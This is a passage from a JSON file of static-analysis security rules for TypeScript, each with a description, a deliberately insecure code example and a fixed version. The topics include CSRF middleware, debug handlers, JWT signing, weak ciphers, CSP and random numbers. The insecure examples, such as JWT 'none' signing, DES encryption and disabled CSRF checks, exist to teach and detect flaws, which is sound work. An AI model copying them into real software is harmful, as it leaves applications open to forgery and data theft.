href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST\nmethod:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\nlet csrfProtection = csrf({ cookie: true });\n\nlet app = express();\n\n// Sensitive: this operation doesn't look like protected by CSURF middleware (csrfProtection is not used)\napp.post('/money_transfer', parseForm, function (req, res) {\n  res.send('Money transferred');\n});\n</pre>\n<p>Protection provided by <a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\napp.use(csrf({ cookie: true, ignoreMethods: [\"POST\", \"GET\"] })); // Sensitive as POST is unsafe method\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\nlet csrfProtection = csrf({ cookie:  true });\n\nlet app = express();\n\napp.post('/money_transfer', parseForm, csrfProtection, function (req, res) { // Compliant\n  res.send('Money transferred')\n});\n</pre>\n<p>Protection provided by <a href=\"https://www.npmjs.com/package/csurf\">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>\n<pre>\nlet csrf = require('csurf');\nlet express = require('express');\n\napp.use(csrf({ cookie: true, ignoreMethods: [\"GET\"] })); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/errorhandler\">errorhandler Express.js middleware</a> should not be used in production:</p>\n<pre>\nconst express = require('express');\nconst errorhandler = require('errorhandler');\n\nlet app = express();\napp.use(errorhandler()); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/errorhandler\">errorhandler Express.js middleware</a> used only in development mode:</p>\n<pre>\nconst express = require('express');\nconst errorhandler = require('errorhandler');\n\nlet app = express();\n\nif (process.env.NODE_ENV === 'development') {\n  app.use(errorhandler());\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5742": {
        "name": "Disabling Certificate Transparency monitoring is security-sensitive",
        "htmlDesc": "<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency\">Certificate Transparency</a> (CT) is an open-framework to\nprotect against identity theft when certificates are issued. <a href=\"https://en.wikipedia.org/wiki/Certificate_authority\">Certificate Authorities</a>\n(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering\nattacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>\n<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular\nthe identity owner to monitor these logs to verify that his identify was not usurped.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The website identity is valuable and well-known, therefore prone to theft. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT\">Expect-CT</a> HTTP header which instructs the web browser\nto check <a href=\"https://www.certificate-transparency.org/known-logs\">public CT logs</a> in order to verify if the website appears inside and if it\nis not, the browser will block the request and display a warning to the user.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/expect-ct\">expect-ct</a> middleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n    helmet({\n      expectCt: false // Sensitive\n    })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application the <a href=\"https://www.npmjs.com/package/expect-ct\">expect-ct</a> middleware is the standard way to implement\nexpect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>\n(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate\nExpect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(helmet.expectCt({\n  enforce: true,\n  maxAge: 86400\n})); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency\">developer.mozilla.org</a> - Certificate Transparency\n  </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Certificate_authority\">wikipedia.org</a> - Certificate Authority </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"DES\", key, iv); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-256-GCM\", key, iv);\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5604": {
        "name": "Using intrusive permissions is security-sensitive",
        "htmlDesc": "<p><a href=\"https://www.w3.org/TR/permissions/#powerful-feature\">Powerful features</a> are browser features (geolocation, camera, microphone …​) that\ncan be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user\nsecurity thus they should only be used if they are really necessary to implement the critical parts of an application.</p>\n<p>This rule highlights intrusive permissions when requested with <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query\">the\nfuture standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to\ncustomize this rule with the permissions considered as intrusive in the context of the web application.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some powerful features used by the application are not really necessary. </li>\n  <li> Users are not clearly informed why and when powerful features are used by the application. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When using <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API\">geolocation API</a>, Firefox for example retrieves personal\ninformation like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a\nhref=\"https://www.google.com/privacy/lsf.html\">Google Location Services</a>:</p>\n<pre>\nnavigator.permissions.query({name:\"geolocation\"}).then(function(result) {\n});  // Sensitive: geolocation is a powerful feature with high privacy concerns\n\nnavigator.geolocation.getCurrentPosition(function(position) {\n  console.log(\"coordinates x=\"+position.coords.latitude+\" and y=\"+position.coords.longitude);\n}); // Sensitive: geolocation is a powerful feature with high privacy concerns\n</pre>\n<h2>Compliant Solution</h2>\n<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when\npossible:</p>\n<pre>\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;\n        Retailer website example\n    &lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:\n    &lt;form method=post&gt;\n        &lt;input type=text value=\"New York\"&gt; &lt;!-- Compliant --&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Web Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/359\">CWE-359 - Exposure of Private Information</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/permissions/\">W3C</a> - Permissions </li>\n  <li> <a href=\"https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites\">Mozilla</a> - Does Firefox share my location with\n  websites? </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S5659": {
        "name": "JWT should be signed and verified with strong cipher algorithms",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in jsonwebtoken</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.sign(payload, key, { algorithm: 'none' }); // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.verify(token, key, {\n    expiresIn: 360000,\n    algorithms: ['none'] // Noncompliant\n}, callbackcheck);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.sign(payload, key, { algorithm: 'HS256' });\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst jwt = require('jsonwebtoken');\n\njwt.verify(token, key, {\n    expiresIn: 360000,\n    algorithms: ['HS256']\n}, callbackcheck);\n</pre>\n<h3>How does this work?</h3>\n<h4>Always sign your tokens</h4>\n<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can\ntamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a\nsigning function, and using it is usually as simple as providing a secret key when the token is created.</p>\n<h4>Choose a strong cipher algorithm</h4>\n<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are\nconsidered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),\nwhich uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be\nable to forge tokens.</p>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5725": {
        "name": "Using remote artifacts without integrity checks is security-sensitive",
        "htmlDesc": "<p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>\n<p>On the client side, where front-end code is executed, malicious code could:</p>\n<ul>\n  <li> impersonate users' identities and take advantage of their privileges on the application. </li>\n  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>\n  <li> gain access to sensitive clients' personal data. </li>\n  <li> deface, or otherwise affect the general availability of the application. </li>\n  <li> mine cryptocurrencies in the background. </li>\n</ul>\n<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For\nexample, server-side malware could:</p>\n<ul>\n  <li> access and modify sensitive technical and business data. </li>\n  <li> elevate its privileges on the underlying operating system. </li>\n  <li> Use the compromised application as a pivot to attack the local network. </li>\n</ul>\n<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes\napplied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication\nwebsite or that was legitimately changed by its author, in a more benign scenario.</p>\n<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and\nintegrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The artifact is a file intended to execute code. </li>\n  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified\nsince the fingerprint was computed.</p>\n<p>In this case, the artifact’s hash must:</p>\n<ul>\n  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>\n  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>\n</ul>\n<p>To do so, the best option is to add the hash in the code explicitly, by following <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes\">Mozilla’s official documentation on\nhow to generate integrity strings</a>.</p>\n<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named \"latest\" or similar, so that the\nfront-end pages do not break when the code of the latest remote artifact changes.</strong></p>\n<h2>Sensitive Code Example</h2>\n<p>The following code sample uses neither integrity checks nor version pinning:</p>\n<pre>\nlet script = document.createElement(\"script\");\nscript.src = \"https://cdn.example.com/latest/script.js\"; // Sensitive\nscript.crossOrigin = \"anonymous\";\ndocument.head.appendChild(script);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlet script = document.createElement(\"script\");\nscript.src = \"https://cdn.example.com/v5.3.6/script.js\";\nscript.integrity = \"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\";\nscript.crossOrigin = \"anonymous\";\ndocument.head.appendChild(script);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/353\">CWE-353 - Missing Support for Integrity Check</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">developer.mozilla.org</a> - Subresource Integrity </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Watering_hole_attack\">Wikipedia, Watering Hole Attacks</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5728": {
        "name": "Disabling content security policy fetch directives is security-sensitive",
        "htmlDesc": "<p>Content security policy (CSP) (fetch directives) is a <a href=\"https://www.w3.org/TR/CSP3/\">W3C standard </a> which is used by a server to specify,\nvia a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)\nattacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">same-origin policy</a> by default.</p>\n<pre>\nContent-Security-Policy: default-src 'self'; script-src ‘self ‘ http://www.example.com\n</pre>\n<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also\nauthorized:</p>\n<pre>\n&lt;img src=\"selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src 'self'; directive is applied  --&gt;\n&lt;img src=\"http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src 'self'; directive is applied  --&gt;\n&lt;script src=\"http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;\n&lt;script src=\"selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;\n&lt;script src=\"http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The resources of the application are fetched from various untrusted locations. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all\ninputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>\n<h2>Sensitive Code Example</h2>\n<p>In a Express.js application, the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> contentSecurityPolicy\nmiddleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\napp.use(\n    helmet({\n      contentSecurityPolicy: false, // sensitive\n    })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Express.js application, a standard way to implement CSP is the <a href=\"https://www.npmjs.com/package/helmet\">helmet contentSecurityPolicy\nmiddleware</a>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\napp.use(helmet.contentSecurityPolicy()); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical\napplications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used\ninstead.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst val = Math.random(); // Sensitive\n// Check if val is used in a security context.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// === Client side ===\nconst crypto = window.crypto || window.msCrypto;\nvar array = new Uint32Array(1);\ncrypto.getRandomValues(array); // Compliant for security-sensitive use cases\n\n// === Server side ===\nconst crypto = require('crypto');\nconst buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
